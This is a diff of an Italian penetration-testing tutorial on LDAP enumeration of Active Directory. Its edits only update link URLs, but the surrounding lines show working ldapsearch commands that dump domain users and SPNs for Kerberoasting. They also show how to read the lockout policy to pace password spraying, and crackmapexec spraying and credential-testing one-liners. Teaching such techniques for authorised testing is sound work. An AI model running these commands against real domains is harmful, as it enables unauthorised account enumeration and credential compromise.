@@ -116,7 +116,7 @@ namingContexts: DC=ForestDnsZones,DC=corp,DC=local
 
 ### Dump completo degli utenti del dominio
 
-Con credenziali valide (anche low-privilege), puoi estrarre tutti gli account utente del dominio. Per capire come ottenere un primo set di credenziali, consulta la [guida al password spraying](https://hackita.it/articoli/bruteforce).
+Con credenziali valide (anche low-privilege), puoi estrarre tutti gli account utente del dominio. Per capire come ottenere un primo set di credenziali, consulta la [guida al password spraying](https://hackita.it/articoli/brute-force/).
 
 ```bash
 ldapsearch -x -H ldap://10.10.10.10 -D "corp\jsmith" -w "Password1" -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName userPrincipalName memberOf description pwdLastSet userAccountControl
@@ -147,7 +147,7 @@ userAccountControl: 66048
 
 ### Estrazione di tutti i Service Principal Names (SPN)
 
-I SPN sono la chiave per il [Kerberoasting, tecnica di attacco su Active Directory](https://hackita.it/articoli/kerberoasting).
+I SPN sono la chiave per il [Kerberoasting, tecnica di attacco su Active Directory](https://hackita.it/articoli/kerberos/).
 
 ```bash
 ldapsearch -x -H ldap://10.10.10.10 -D "corp\jsmith" -w "Password1" -b "DC=corp,DC=local" "(servicePrincipalName=*)" sAMAccountName servicePrincipalName
@@ -185,7 +185,7 @@ minPwdLength: 8
 maxPwdAge: -36288000000000
 ```
 
-**Lettura dell'output:** lockout dopo 5 tentativi falliti, durata lockout 30 minuti (-18000000000 in 100-nanosecond intervals). Password minima 8 caratteri, storia di 12 password, max age 42 giorni. Questi parametri calibrano il tuo [attacco di password spraying](https://hackita.it/articoli/passwordspraying): massimo 4 tentativi per utente, poi attendi 31 minuti.
+**Lettura dell'output:** lockout dopo 5 tentativi falliti, durata lockout 30 minuti (-18000000000 in 100-nanosecond intervals). Password minima 8 caratteri, storia di 12 password, max age 42 giorni. Questi parametri calibrano il tuo [attacco di password spraying](https://hackita.it/articoli/passwordspraying/): massimo 4 tentativi per utente, poi attendi 31 minuti.
 
 ### Ricerca di computer e Domain Controller
 
@@ -242,7 +242,7 @@ ldap_bind: Inappropriate authentication (48)
     additional info: 00000000: LdapErr: DSID-0C0907C2, comment: Error in attribute conversion operation, data 0, v2580
 ```
 
-**Cosa fai dopo:** hai la lista completa degli username. Esporta con `| grep sAMAccountName | awk '{print $2}' > users.txt` e usa questa lista per password spraying con `crackmapexec ldap 10.10.10.10 -u users.txt -p 'Spring2026!' --continue-on-success`. Approfondisci come orchestrare l'attacco nella [guida a CrackMapExec](https://hackita.it/articoli/crackmapexec).
+**Cosa fai dopo:** hai la lista completa degli username. Esporta con `| grep sAMAccountName | awk '{print $2}' > users.txt` e usa questa lista per password spraying con `crackmapexec ldap 10.10.10.10 -u users.txt -p 'Spring2026!' --continue-on-success`. Approfondisci come orchestrare l'attacco nella [guida a CrackMapExec](https://hackita.it/articoli/crackmapexec/).
 
 **LDAP Pass-back Attack**
 
@@ -315,7 +315,7 @@ description: Initial pwd = Corp2026!
 # numEntries: 0
 ```
 
-**Cosa fai dopo:** testa le password trovate con `crackmapexec smb 10.10.10.10 -u jsmith -p 'Welcome1!'`. Se funzionano, verifica i gruppi di appartenenza per capire il livello di privilegio. Consulta la guida completa al [testing SMB sulla porta 445](https://hackita.it/articoli/smb) per il passo successivo.
+**Cosa fai dopo:** testa le password trovate con `crackmapexec smb 10.10.10.10 -u jsmith -p 'Welcome1!'`. Se funzionano, verifica i gruppi di appartenenza per capire il livello di privilegio. Consulta la guida completa al [testing SMB sulla porta 445](https://hackita.it/articoli/smb/) per il passo successivo.
 
 **LDAP Injection (applicazioni web)**
 
